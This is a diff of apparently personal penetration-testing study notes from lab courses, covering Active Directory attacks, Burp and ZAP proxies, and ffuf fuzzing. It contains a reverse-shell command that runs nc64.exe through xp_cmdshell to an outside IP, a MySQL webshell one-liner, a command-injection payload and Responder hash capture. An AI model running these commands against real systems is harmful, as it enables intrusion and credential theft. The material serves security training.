@@ -1,6 +1,6 @@
-tt  JPT
+  JPT
 #Note taking tools
-		
+
 	Cherrytree	Visual Studio Code	Evernote
 	Notion		GitBook			Sublime Text
 	Notepad++
@@ -2709,7 +2709,8 @@ Internet Layer
 | `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
 | `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
 | `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
-| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
+| `sqlcmd> xp_cmdshell 'whoami'` |B Execute a system command from MSSQL server. |
+ xp_cmdshell "c:\temp\PrintSpoofer.exe -c "c:\temp\nc64.exe 172.16.7.240 443 -e cmd""
 | `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
 | `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
 | `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
@@ -6689,15 +6690,15 @@ Identifying Users
 	[+] Identifying users
 		> If our client does not provide us with a user to start testing with (which is often the case), we will need to find a way to establish a foothold in the domain by either obtaining clear text credentials or an NTLM password hash for a user, a SYSTEM shell on a domain-joined host, or a shell in the context of a domain user account. Obtaining a valid user with credentials is critical in the early stages of an internal penetration test. This access (even at the lowest level) opens up many opportunities to perform enumeration and even attacks. Let's look at one way we can start gathering a list of valid users in a domain to use later in our assessment.
 		* Kerbrute - Internal AD Username Enumeration
-				> Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from Insidetrusthttps://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.
+				> Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the jsmith.txt or jsmith2.txt user lists from Insidetrust(https://github.com/insidetrust/statistically-likely-usernames). This repository contains many different user lists that can be extremely useful when attempting to enumerate users when starting from an unauthenticated perspective. We can point Kerbrute at the DC we found earlier and feed it a wordlist. The tool is quick, and we will be provided with results letting us know if the accounts found are valid or not, which is a great starting point for launching attacks such as password spraying, which we will cover in-depth later in this module.
 				> To get started with Kerbrute, we can download precompiled binaries for the tool for testing from Linux, Windows, and Mac, or we can compile it ourselves. This is generally the best practice for any tool we introduce into a client environment. To compile the binaries to use on the system of our choosing, we first clone the repo:	
 				
 						m1l0js@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git
-    
-				> Typing make help will show us the compiling options available.
-				Listing Compiling Options
+
+						> Typing make help will show us the compiling options available.
+						Listing Compiling Options
 						m1l0js@htb[/htb]$ make help
-						
+
 						help:            Show this help.
 						windows:  Make Windows x86 and x64 Binaries
 						linux:  Make Linux x86 and x64 Binaries
@@ -6816,6 +6817,8 @@ Identifying Potential Vulnerabilities
 	> We can kick off a Responder session rather quickly:
 	> Starting Responder with Default Settings
 		sudo responder -I ens224 
+	> Other config
+		sudo responder -I ens224 -wF -v
 	> Typically we should start Responder and let it run for a while in a tmux window while we perform other enumeration tasks to maximize the number of hashes that we can obtain. Once we are ready, we can pass these hashes to Hashcat using hash mode 5600 for NTLMv2 hashes that we typically obtain with Responder. We may at times obtain NTLMv1 hashes and other types of hashes and can consult the Hashcat example hashes page to identify them and find the proper hash mode. If we ever obtain a strange or unknown hash, this site is a great reference to help identify it. 
 		
 	> Once we have enough, we need to get these hashes into a usable format for us right now. NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pash-the-hash, meaning we have to attempt to crack them offline. We can do this with tools such as Hashcat and John.
@@ -9178,7 +9181,8 @@ README.md  scanner.py
 
 	> Notice how at the end of the command, we include the path to the share hosting our payload (\\<ip address of attack host>\ShareName\nameofpayload.dll). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
 	> Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.
-PetitPotam (MS-EFSRPC)
+
+* PetitPotam (MS-EFSRPC)
 
 	> PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools(https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
 	> This(https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.
@@ -10097,6 +10101,749 @@ AD Security Blog by Sean Metcalf is a treasure box full of awesome content, all 
 Shenaniganslabs is a great group of security researchers discussing many different topics in the security realm. These can include new vulnerabilities to Threat Actor TTPs.
 Dirk-jan Mollema also has a great blog documenting his adventures with AD security, Azure, protocols, vulnerabilities, Python, etc.
 The DFIR Report is maintained by a talented team of Blue Teamers/Infosec Content creators that share their findings from recent intrusion incidents in incredible detail. Many of their posts showcase AD attacks and the artifacts that attackers leave behind.
+
+-=-=-=-=
+=-=-=-=-
+[+] Intro to Web Proxies
+
+* ZAP 
+	> ZAP can also be downloaded as a cross-platform JAR file and launched with the java -jar command or by double-clicking on it, similarly to Burp.
+		zaproxy 
+* Tip: If you prefer to use to a dark theme, you may do so in Burp by going to (User Options>Display) and selecting "dark" under (theme), and in ZAP by going to (Tools>Options>Display) and selecting "Flat Dark" in (Look and Feel).
+* Installing CA certificate
+	> Burp 
+		http://burp
+	> ZAP 
+		Tools>Options>Dynamic SSL Certificate), then click on Save
+	
+* Show/hide elements
+	> Burp: Proxy>Options>Response Modification
+	> ZAP: Show/Enable button
+* Show comments
+	> zap: hud>comments
+* Automatic request modification
+	> We can choose to match any text within our requests, either in the request header or request body, and then replace them with different text. For the sake of demonstration, let's replace our User-Agent with HackTheBox Agent 1.0, which may be handy in cases where we may be dealing with filters that block certain User-Agents.
+		> Burp Match and Replace
+			- We can go to (Proxy>Options>Match and Replace) and click on Add in Burp. As the below screenshot shows, we will set the following options: (https://academy.hackthebox.com/storage/modules/110/burp_match_replace_user_agent_1.jpg)
+			- Type: Request header	Since the change we want to make will be in the request header and not in its body.
+			- Match: ^User-Agent.*$	The regex pattern that matches the entire line with User-Agent in it.
+			- Replace: User-Agent: HackTheBox Agent 1.0	This is the value that will replace the line we matched above.
+			- Regex match: True	We don't know the exact User-Agent string we want to replace, so we'll use regex to match any value that matches the pattern we specified above.
+		> ZAP Replacer
+			- ZAP has a similar feature called Replacer, which we can access by pressing [CTRL+R] or clicking on Replacer in ZAP's options menu. It is fairly similar to what we did above, so we can click on Add and add the same options we user earli
+			    Description: HTB User-Agent.
+			    Match Type: Request Header (will add if not present).
+			    Match String: User-Agent. We can select the header we want from the drop-down menu, and ZAP will replace its value.
+			    Replacement String: HackTheBox Agent 1.0.
+			    Enable: True.
+		> ZAP also has the Request Header String that we can use with a Regex pattern. Try using this option with the same values we used for Burp to see how it works.
+		> ZAP also provides the option to set the Initiators, which we can access by clicking on the other tab in the windows shown above. Initiators enable us to select where our Replacer option will be applied. We will keep the default option of Apply to all HTTP(S) messages to apply everywhere.
+			+ Other example of replacement
+				Change input type to text:
+				- Match Type: Response Body String.
+				- Match Regex: False.
+				- Match String: type="number".
+				- Replacement String: type="text".
+				- Enable: True.
+				
+				Change max length to 100:
+				- Match Type: Response Body String.
+				- Match Regex: False.
+				- Match String: maxlength="3".
+				- Replacement String: maxlength="100".
+				- Enable: True.
+			
+		> We can now enable request interception by pressing [CTRL+B], then can visit any page in the pre-configured ZAP browser:
+
+* Automatic Response Modification
+	> The same concept can be used with HTTP responses as well. In the previous section, you may have noticed when we intercepted the response that the modifications we made to the IP field were temporary and were not applied when we refreshed the page unless we intercepted the response and added them again. To solve this, we can automate response modification similarly to what we did above to automatically enable any characters in the IP field for easier command injection.
+	> Let us go back to (Proxy>Options>Match and Replace) in Burp to add another rule. This time we will use the type of Response body since the change we want to make exists in the response's body and not in its headers. In this case, we do not have to use regex as we know the exact string we want to replace, though it is possible to use regex to do the same thing if we prefer.
+    		- Type: Response body.
+    		- Match: type="number".
+    		- Replace: type="text".
+    		- Regex match: False.
+	> Try adding another rule to change maxlength="3" to maxlength="100".
+	> Now, once we refresh the page with [CTRL+SHIFT+R], we'll see that we can add any input to the input field, and this should persist between page refreshes as well:
+	> We can now click on Ping, and our command injection should work without intercepting and modifying the request.
+
+* Some payloads to crash the logic of the webapp
+	ip=1;ls+-a; //post method
+
+* URL encoding
+	> Some of the key characters we need to encode are:
+    		- Spaces: May indicate the end of request data if not encoded
+    		- &: Otherwise interpreted as a parameter delimiter
+    		- #: Otherwise interpreted as a fragment identifier
+
+* Proxying tools
+	> proxychains
+	> nmap 
+		m1l0js@htb[/htb]$ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
+	> metasploit
+		set proxies HTTP://127.0.0.1:8080
+
+* Burp intruder 
+	> Type of attacks ==> (https://portswigger.net/burp/documentation/desktop/tools/intruder/positions#attack-type)
+		- Note: Be sure to leave the extra two lines at the end of the request, otherwise we may get an error response from the server.
+	> Next, we need to select the Payload Type, which is the type of payloads/wordlists we will be using. Burp provides a variety of Payload Types, each of which acts in a certain way. For example:
+    		- Simple List: The basic and most fundamental type. We provide a wordlist, and Intruder iterates over each line in it.
+    		- Runtime file: Similar to Simple List, but loads line-by-line as the scan runs to avoid excessive memory usage by Burp. (With a very large wordlist)
+    		- Character Substitution: Lets us specify a list of characters and their replacements, and Burp Intruder tries all potential permutations.
+
+	> Payload processing
+		- /opt/useful/SecLists/Discovery/Web-Content/common.txt 
+		- Let's try adding a rule that skips any lines that start with a . (as shown in the wordlist screenshot earlier). We can do that by clicking on the Add button and then selecting Skip if matches regex, which allows us to provide a regex pattern for items we want to skip. Then, we can provide a regex pattern that matches lines starting with ., which is: ^\..*$:
+	> Payload encoding
+
+* ZAP Fuzzer
+	> Payloads
+		+ The attack payloads in ZAP's Fuzzer are similar in concept to Intruder's Payloads, though they are not as advanced as Intruder's. We can click on the Add button to add our payloads and select from 8 different payload types. The following are some of them:
+
+    		- File: This allows us to select a payload wordlist from a file.
+    		- File Fuzzers: This allows us to select wordlists from built-in databases of wordlists.
+    		- Numberzz: Generates sequences of numbers with custom increments.
+
+		+ One of the advantages of ZAP Fuzzer is having built-in wordlists we can choose from so that we do not have to provide our own wordlist. More databases can be installed from the ZAP Marketplace, as we will see in a later section. So, we can select File Fuzzers as the Type, and then we will select the first wordlist from dirbuster:
+
+* Using wfuzz
+	wfuzz -z file --zP fn=users.txt,encoder=md5  -b cookie=FUZZ --hh 246  http://138.68.162.218:30658/skills/
+	wfuzz -z file --zP fn=users.txt,encoder=md5  -b cookie=FUZZ --hh 246  http://138.68.162.218:30658/skills/
+	curl -s --cookie "cookie=ee11cbb19052e40b07aac0ca060c23ee" http://138.68.162.218:30658/skills/
+
+	wfuzz -e payloads
+
+* Active scanner	
+	+ BURP	
+		+ We finally reach the most powerful part of Burp Scanner, which is its Active Vulnerability Scanner. An active scan runs a more comprehensive scan than a Passive Scan, as follows:
+    			- It starts by running a Crawl and a web fuzzer (like dirbuster/ffuf) to identify all possible pages
+    			- It runs a Passive Scan on all identified pages
+    			- It checks each of the identified vulnerabilities from the Passive Scan and sends requests to verify them
+    			- It performs a JavaScript analysis to identify further potential vulnerabilities
+    			- It fuzzes various identified insertion points and parameters to look for common vulnerabilities like XSS, Command Injection, SQL Injection, and other common web vulnerabilities
+
+-==-=-=
+[+] Attacking web applications with ffuf
+	> The specific wordlist we will be utilizing for pages and directory fuzzing is another commonly used wordlist called directory-list-2.3. 
+* Tip: Taking a look at this wordlist we will notice that it contains copyright comments at the beginning, which can be considered as part of the wordlist and clutter the results. We can use the following command to get rid of these lines with the -ic flag.
+
+# Ffuf
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| `ffuf -h` | ffuf help |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` | Directory Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` | Extension Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php` | Page Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` | Recursive Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/` | Sub-domain Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx` | VHost Fuzzing |
+| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx` | Parameter Fuzzing - GET |
+| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
+| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Value Fuzzing |  
+
+# Wordlists
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
+| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt` | Extensions Wordlist |
+| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` | Domain Wordlist |
+| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt` | Parameters Wordlist |
+
+# Misc
+
+| **Command**   | **Description**   |
+| --------------|-------------------|
+| `sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'` | Add DNS entry |
+| `for i in $(seq 1 1000); do echo $i >> ids.txt; done` | Create Sequence Wordlist |
+| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST |
+
+* Directory Fuzzing
+	> As we can see from the example above, the main two options are -w for wordlists and -u for the URL. We can assign a keyword to a wordlist to refer to it where we want to fuzz. For example, we can pick our wordlist and assign the keyword FUZZ to it by adding :FUZZ after it:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ
+	> Next, as we want to be fuzzing for web directories, we can place the FUZZ keyword where the directory would be within our URL, with:
+		m1l0js@htb[/htb]$ ffuf -w <SNIP> -u http://SERVER_IP:PORT/FUZZ
+	> Now, let's start our target in the question below and run our final command on it:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
+	> We see that ffuf tested for almost 90k URLs in less than 10 seconds. This speed may vary depending on your internet speed and ping if you used ffuf on your machine, but it should still be extremely fast.
+	> We can even make it go faster if we are in a hurry by increasing the number of threads to 200, for example, with -t 200, but this is not recommended, especially when used on a remote site, as it may disrupt it, and cause a Denial of Service, or bring down your internet connection in severe cases. 
+
+* Extension Fuzzing
+	> One common way to identify that is by finding the server type through the HTTP response headers and guessing the extension. For example, if the server is apache, then it may be .php, or if it was IIS, then it could be .asp or .aspx, and so one. This method is not very practical, though. So, we will again utilize ffuf to fuzz the extension, similar to how we fuzzed for directories. Instead of placing the FUZZ keyword where the directory name would be, we would place it where the extension would be .FUZZ, and use a wordlist for common extensions. We can utilize the following wordlist in SecLists for extensions:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ <SNIP>
+	> Before we start fuzzing, we must specify which file that extension would be at the end of! We can always use two wordlists and have a unique keyword for each, and then do FUZZ_1.FUZZ_2 to fuzz for both. However, there is one file we can always find in most websites, which is index.*, so we will use it as our file and fuzz extensions on it.
+	> Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after "index" in our fuzzing.
+	> Now, we can rerun our command, carefully placing our FUZZ keyword where the extension would be after index:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
+We do get a couple of hits, but only .php gives us a response with code 200. Great! We now know that this website runs on PHP to start fuzzing for PHP files.
+
+* Page Fuzzing
+	> We will now use the same concept of keywords we've been using with ffuf, use .php as the extension, place our FUZZ keyword where the filename should be, and use the same wordlist we used for fuzzing directories:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
+		index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
+		REDACTED                [Status: 200, Size: 465, Words: 42, Lines: 15]
+	> We get a couple of hits; both have an HTTP code 200, meaning we can access them. index.php has a size of 0, indicating that it is an empty page, while the other does not, which means that it has content. We can visit any of these pages to verify this:
+
+
+* Recursive Flags
+	> When we scan recursively, it automatically starts another scan under any newly identified directories that may have on their pages until it has fuzzed the main website and all of its subdirectories.
+	> Some websites may have a big tree of sub-directories, like /login/user/content/uploads/...etc, and this will expand the scanning tree and may take a very long time to scan them all. This is why it is always advised to specify a depth to our recursive scan, such that it will not scan directories that are deeper than that depth. Once we fuzz the first directories, we can then pick the most interesting directories and run another scan to direct our scan better.
+	> In ffuf, we can enable recursive scanning with the -recursion flag, and we can specify the depth with the -recursion-depth flag. If we specify -recursion-depth 1, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like /login/user, it will not fuzz them for pages). When using recursion in ffuf, we can specify our extension with -e .php
+	> Note: we can still use `.php` as our page extension, as these extensions are usually site-wide.
+	> Finally, we will also add the flag -v to output the full URLs. Otherwise, it may be difficult to tell which .php file lies under which directory.
+
+* Recursive Scanning
+	> Let us repeat the first command we used, add the recursion flags to it while specifying .php as our extension, and see what results we get:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+	> As we can see this time, the scan took much longer, sent almost six times the number of requests, and the wordlist doubled in size (once with .php and once without). Still, we got a large number of results, including all the results we previously identified, all with a single line of command.
+
+[+] DNS Records
+	> Once we accessed the page under /blog, we got a message saying Admin panel moved to academy.htb. If we visit the website in our browser, we get can’t connect to the server at www.academy.htb:
+	> This is because the exercises we do are not public websites that can be accessed by anyone but local websites within HTB. Browsers only understand how to go to IPs, and if we provide them with a URL, they try to map the URL to an IP by looking into the local /etc/hosts file and the public DNS Domain Name System. If the URL is not in either, it would not know how to connect to it.
+	> If we visit the IP directly, the browser goes to that IP directly and knows how to connect to it. But in this case, we tell it to go to academy.htb, so it looks into the local /etc/hosts file and doesn't find any mention of it. It asks the public DNS about it (such as Google's DNS 8.8.8.8) and does not find any mention of it, since it is not a public website, and eventually fails to connect. So, to connect to academy.htb, we would have to add it to our /etc/hosts file. We can achieve that with the following command:
+		m1l0js@htb[/htb]$ sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'
+	> Now we can visit the website (don't forget to add the PORT in the URL) and see that we can reach the website:
+	> However, we get the same website we got when we visit the IP directly, so academy.htb is the same domain we have been testing so far. We can verify that by visiting /blog/index.php, and see that we can access the page.
+	> When we run our tests on this IP, we did not find anything about admin or panels, even when we did a full recursive scan on our target. So, in this case, we start looking for sub-domains under '*.academy.htb' and see if we find anything, which is what we will attempt in the next section.
+
+
+[+] Sub-domain Fuzzing
+	> In this section, we will learn how to use ffuf to identify sub-domains (i.e., *.website.com) for any website.
+
+* Sub-domains
+	> A sub-domain is any website underlying another domain. For example, https://photos.google.com is the photos sub-domain of google.com.
+	> In this case, we are simply checking different websites to see if they exist by checking if they have a public DNS record that would redirect us to a working server IP. So, let's run a scan and see if we get any hits. Before we can start our scan, we need two things:
+    		- A wordlist
+    		- A target
+	> Luckily for us, in the SecLists repo, there is a specific section for sub-domain wordlists, consisting of common words usually used for sub-domains. We can find it in /opt/useful/SecLists/Discovery/DNS/. In our case, we would be using a shorter wordlist, which is subdomains-top1million-5000.txt. If we want to extend our scan, we can pick a larger list.
+	> As for our target, we will use hackthebox.eu as our target and run our scan on it. Let us use ffuf and place the FUZZ keyword in the place of sub-domains, and see if we get any hits:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.hackthebox.eu/
+	> We see that we do get a few hits back. We can verify that these are actual sub-domains by visiting one of them:
+	> We see that indeed these are working sub-domains. Now, we can try running the same thing on academy.htb and see if we get any hits back:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.academy.htb/
+	> We see that we do not get any hits back. Does this mean that there are no sub-domain under academy.htb? - No.
+	> This means that there are no public sub-domains under academy.htb, as it does not have a public DNS record, as previously mentioned. Even though we did add academy.htb to our /etc/hosts file, we only added the main domain, so when ffuf is looking for other sub-domains, it will not find them in /etc/hosts, and will ask the public DNS, which obviously will not have them.
+
+
+[+] Vhost Fuzzing
+	> As we saw in the previous section, we were able to fuzz public sub-domains using public DNS records. However, when it came to fuzzing sub-domains that do not have a public DNS record or sub-domains under websites that are not public, we could not use the same method. In this section, we will learn how to do that with Vhost Fuzzing.
+* Vhosts vs. Sub-domains
+	> The key difference between VHosts and sub-domains is that a VHost is basically a 'sub-domain' served on the same server and has the same IP, such that a single IP could be serving two or more different websites.
+	> VHosts may or may not have public DNS records.
+	> In many cases, many websites would actually have sub-domains that are not public and will not publish them in public DNS records, and hence if we visit them in a browser, we would fail to connect, as the public DNS would not know their IP. Once again, if we use the sub-domain fuzzing, we would only be able to identify public sub-domains but will not identify any sub-domains that are not public.
+	> This is where we utilize VHosts Fuzzing on an IP we already have. We will run a scan and test for scans on the same IP, and then we will be able to identify both public and non-public sub-domains and VHosts.
+
+* Vhosts Fuzzing
+	> To scan for VHosts, without manually adding the entire wordlist to our /etc/hosts, we will be fuzzing HTTP headers, specifically the Host: header. To do that, we can use the -H flag to specify a header and will use the FUZZ keyword within it, as follows:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
+		mail2                   [Status: 200, Size: 900, Words: 423, Lines: 56]
+		dns2                    [Status: 200, Size: 900, Words: 423, Lines: 56]
+		ns3                     [Status: 200, Size: 900, Words: 423, Lines: 56]
+		dns1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
+		lists                   [Status: 200, Size: 900, Words: 423, Lines: 56]
+		webmail                 [Status: 200, Size: 900, Words: 423, Lines: 56]
+		static                  [Status: 200, Size: 900, Words: 423, Lines: 56]
+		web                     [Status: 200, Size: 900, Words: 423, Lines: 56]
+		www1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
+<...SNIP...>
+
+We see that all words in the wordlist are returning 200 OK! This is expected, as we are simply changing the header while visiting http://academy.htb:PORT/. So, we know that we will always get 200 OK. However, if the VHost does exist and we send a correct one in the header, we should get a different response size, as in that case, we would be getting the page from that VHosts, which is likely to show a different page.
+
+[+] Filtering Results
+	> So far, we have not been using any filtering to our ffuf, and the results are automatically filtered by default by their HTTP code, which filters out code 404 NOT FOUND, and keeps the rest. However, as we saw in our previous run of ffuf, we can get many responses with code 200. So, in this case, we will have to filter the results based on another factor, which we will learn in this section.
+* Filtering
+	> In this case, we cannot use matching, as we don't know what the response size from other VHosts would be. We know the response size of the incorrect results, which, as seen from the test above, is 900, and we can filter it out with -fs 900. Now, let's repeat the same previous command, add the above flag, and see what we get:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
+		admin                   [Status: 200, Size: 0, Words: 1, Lines: 1]
+	> We can verify that by visiting the page, and seeing if we can connect to it:
+	> Note 1: Don't forget to add "admin.academy.htb" to "/etc/hosts".
+	> Note 2: If your exercise has been restarted, ensure you still have the correct port when visiting the website.
+	> We see that we can access the page, but we get an empty page, unlike what we got with academy.htb, therefore confirming this is indeed a different VHost. We can even visit https://admin.academy.htb:PORT/blog/index.php, and we will see that we would get a 404 PAGE NOT FOUND, confirming that we are now indeed on a different VHost.
+	> Try running a recursive scan on admin.academy.htb, and see what pages you can identify.
+
+
+[+] Parameter Fuzzing - GET
+	> If we run a recursive ffuf scan on admin.academy.htb, we should find http://admin.academy.htb:PORT/admin/admin.php. If we try accessing this page, we see the following:
+	> That indicates that there must be something that identifies users to verify whether they have access to read the flag. We did not login, nor do we have any cookie that can be verified at the backend. So, perhaps there is a key that we can pass to the page to read the flag. Such keys would usually be passed as a parameter, using either a GET or a POST HTTP request. This section will discuss how to fuzz for such parameters until we identify a parameter that can be accepted by the page.
+	> Tip: Fuzzing parameters may expose unpublished parameters that are publicly accessible. Such parameters tend to be less tested and less secured, so it is important to test such parameters for the web vulnerabilities we discuss in other modules.
+
+* GET Request Fuzzing
+	> Similarly to how we have been fuzzing various parts of a website, we will use ffuf to enumerate parameters. Let us first start with fuzzing for GET requests, which are usually passed right after the URL, with a ? symbol, like:
+    		http://admin.academy.htb:PORT/admin/admin.php?param1=key.
+	> So, all we have to do is replace param1 in the example above with FUZZ and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, SecLists has just that in /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt. With that, we can run our scan.
+	> Once again, we will get many results back, so we will filter out the default response size we are getting.
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
+	> We do get a hit back. Let us try to visit the page and add this GET parameter, and see whether we can read the flag now:
+	> As we can see, the only hit we got back has been deprecated and appears to be no longer in use.
+
+[+] Parameter Fuzzing - POST
+	> The main difference between POST requests and GET requests is that POST requests are not passed with the URL and cannot simply be appended after a ? symbol. POST requests are passed in the data field within the HTTP request. Check out the Web Requests module to learn more about HTTP requests.
+	> To fuzz the data field with ffuf, we can use the -d flag, as we saw previously in the output of ffuf -h. We also have to add -X POST to send POST requests.
+	> Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".
+	> So, let us repeat what we did earlier, but place our FUZZ keyword after the -d flag:
+		m1l0js@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
+	> As we can see this time, we got a couple of hits, the same one we got when fuzzing GET and another parameter, which is id. Let's see what we get if we send a POST request with the id parameter. We can do that with curl, as follows:
+		m1l0js@htb[/htb]$ curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
+		<div class='center'><p>Invalid id!</p></div>
+	> As we can see, the message now says Invalid id!.
+
+[+] Value Fuzzing
+	> After fuzzing a working parameter, we now have to fuzz the correct value that would return the flag content we need. This section will discuss fuzzing for parameter values, which should be fairly similar to fuzzing for parameters, once we develop our wordlist.
+
+* Custom Wordlist
+	> When it comes to fuzzing parameter values, we may not always find a pre-made wordlist that would work for us, as each parameter would expect a certain type of value.
+	> For some parameters, like usernames, we can find a pre-made wordlist for potential usernames, or we may create our own based on users that may potentially be using the website. For such cases, we can look for various wordlists under the seclists directory and try to find one that may contain values matching the parameter we are targeting. In other cases, like custom parameters, we may have to develop our own wordlist. In this case, we can guess that the id parameter can accept a number input of some sort. These ids can be in a custom format, or can be sequential, like from 1-1000 or 1-1000000, and so on. We'll start with a wordlist containing all numbers from 1-1000.
+	> There are many ways to create this wordlist, from manually typing the IDs in a file, or scripting it using Bash or Python. The simplest way is to use the following command in Bash that writes all numbers from 1-1000 to a file:
+		m1l0js@htb[/htb]$ for i in $(seq 1 1000); do echo $i >> ids.txt; done
+	> Once we run our command, we should have our wordlist ready:
+	> Now we can move on to fuzzing for values.
+
+* Value Fuzzing
+	> Our command should be fairly similar to the POST command we used to fuzz for parameters, but our FUZZ keyword should be put where the parameter value would be, and we will use the ids.txt wordlist we just created, as follows:
